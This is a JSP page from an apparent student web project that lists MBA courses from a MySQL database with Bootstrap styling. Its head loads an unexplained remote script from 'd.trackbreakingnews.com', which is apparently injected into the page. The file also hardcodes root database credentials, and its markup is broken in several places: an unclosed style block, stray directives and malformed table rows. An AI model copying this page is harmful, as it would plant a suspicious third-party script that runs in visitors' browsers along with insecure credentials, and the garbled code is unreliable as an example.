
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
 <%@ page import="java.sql.*" %>     <%@ page import= "java.io.*" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/sql" prefix="sql" %>   
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Profile</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  
  <style type="text/css">
  .XXXX h5{
  font-weight:lighter;
  font-size:18px;
  font-family: Lato;
  }
  .XXXX strong {
  font-weight:normal;
  font-size:18px;
  font-family: Lato;
  
  }
  .XXXX {
  position: relative;
  top:-160px;
  }
  .XZ {
  position:relative;
  right:100px;
  margin-left: 185px;

  }
  .CCCx {
  position: relative;
  top:-40px;
  }
  
       <%@ page import= "java.io.*" %>
					</ul>
	          </div> 
	      </div>
	  </div>
<sql:setDataSource
        var="myDS"
        driver="com.mysql.jdbc.Driver"
        url="jdbc:mysql://localhost:3306/mystore"
        user="root" password="root"
    />
    <sql:query var="listUsers"   dataSource="${myDS}">
        SELECT * FROM management;
    </sql:query>
 
<br/>
<nav>
	<ul class="pager XZ">
    <li class="previous"><a href="Department.jsp"><span >&larr;</span> Back</a></li>
    <li class="next"><a href="Data1.jsp"><span >&rarr;</span> Home</a></li>
  </ul>
</nav>
<div class="container CCCx">
<div class="row">
<div class="col-lg-12">
<div class="table-responsive"><br/><br/> 
<div class="alert alert-info lead" role="alert">Faculty Of Master of Business Administration (Courses)</div>
</div></div></div></div>
<div class="container XXXX">
<div class="row">
<div class="col-lg-12">
<div class="table-responsive">

<table class="table table-hover table-bordered">

            <c:forEach var="allcourses" items="${listUsers.rows}">
			<td class="danger"><h2 class="lead"><strong><c:out value="${allcourses.cname}" /> </strong></h2></td>
			</tr>
			<div class="Well"><td class="warning"> <strong>Procedure:</strong><br/><hr><h5><c:out value="${allcourses.Procedure}" /> </h5></td><br/></div>
		   
			<div class="Well"><td class="warning"><strong>CourseType:</strong><br/><hr><h5><c:out value="${allcourses.CourseType}" /></h5></td><br/></div>
	       <div class="Well"> <td class="warning"><strong> Eligibility:</strong><br/><hr><h5><c:out value="${allcourses.Eligibility}" /></h5></td><br/></div>
</tr>
         </c:forEach>
        </table>
    </div>
</div>
</div>
</div>
			<div class="Cvv">
						<div class="container-fluid FFF">
							<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay (</em>Twitter</em>)</small>
							</h5>
						</div>
					</div>
				</div>
	
                   
  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
